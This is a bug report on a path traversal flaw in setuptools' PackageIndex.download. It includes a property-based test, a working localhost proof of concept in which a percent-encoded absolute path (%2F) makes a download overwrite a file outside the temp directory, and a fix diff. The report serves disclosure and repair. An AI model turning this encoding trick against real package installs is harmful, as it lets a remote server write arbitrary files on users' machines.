# Bug Report: setuptools.package_index PackageIndex.download writes outside tmpdir (path traversal)

**Target**: `setuptools.package_index.PackageIndex._resolve_download_filename` / `PackageIndex.download`
**Severity**: High
**Bug Type**: Logic
**Date**: 2026-10-28

## Summary

`PackageIndex.download` says a URL spec "is downloaded to a subpath of `tmpdir`". But the filename comes from the URL's last path segment after percent-decoding. A segment like `%2Fetc%2Fpasswd` decodes to an absolute path, and `os.path.join(tmpdir, "/etc/passwd")` throws `tmpdir` away. A malicious index page or download link can therefore write any file the user has permission to write.

## Property-Based Test

```python
import os, urllib.parse
from hypothesis import given, settings, strategies as st
from setuptools.package_index import PackageIndex

seg = st.text(st.characters(codec="utf-8", exclude_characters="\x00"), min_size=1)

@settings(max_examples=1000)
@given(seg)
def test_download_filename_stays_in_tmpdir(name):
    tmpdir = "/tmp/pkgidx_dl"
    url = "https://example.com/packages/" + urllib.parse.quote(name, safe="")
    result = PackageIndex._resolve_download_filename(url, tmpdir)
    real = os.path.realpath(result)
    assert os.path.commonpath([real, os.path.realpath(tmpdir)]) == os.path.realpath(tmpdir), (url, result)
```

**Failing input**: `name='/'` (URL `https://example.com/packages/%2F` resolves to `/`)

## Reproducing the Bug

```python
import os, tempfile, http.server, threading
from setuptools.package_index import PackageIndex

victim_dir = tempfile.mkdtemp()
target = os.path.join(victim_dir, "pwned.txt")

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type", "application/octet-stream"); self.end_headers()
        self.wfile.write(b"attacker content")
    def log_message(self, *a): pass

srv = http.server.HTTPServer(("127.0.0.1", 0), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()

tmpdir = tempfile.mkdtemp()
url = f"http://127.0.0.1:{srv.server_port}/pkg/" + target.replace("/", "%2F")
print(PackageIndex().download(url, tmpdir))
print(open(target).read())
```

Output: the returned path is `.../pwned.txt` in `victim_dir`, not inside `tmpdir`, and the file contains `attacker content`.

## Why This Is A Bug

The `download()` docstring promises: "If `spec` is a URL, it is downloaded to a subpath of `tmpdir`". The existing `'..'` stripping shows the code is meant to stop traversal, but it does not handle absolute paths produced by `unquote` (`%2F`). On Windows, it also misses drive-letter paths (`C:...`). Download URLs come from remote index pages (`process_index`, `find_external_links`), so a remote server can write any file the user can write. This is the issue tracked as CVE-2025-47273.

## Fix

```diff
--- a/setuptools/package_index.py
+++ b/setuptools/package_index.py
@@ def _resolve_download_filename(url, tmpdir):
         if name.endswith('.egg.zip'):
             name = name[:-4]  # strip the extra .zip before download

-        return os.path.join(tmpdir, name)
+        filename = os.path.join(tmpdir, name)
+
+        # ensure path resolves within the tmpdir
+        if not filename.startswith(str(tmpdir)):
+            raise ValueError(f"Invalid filename {filename}")
+
+        return filename
```
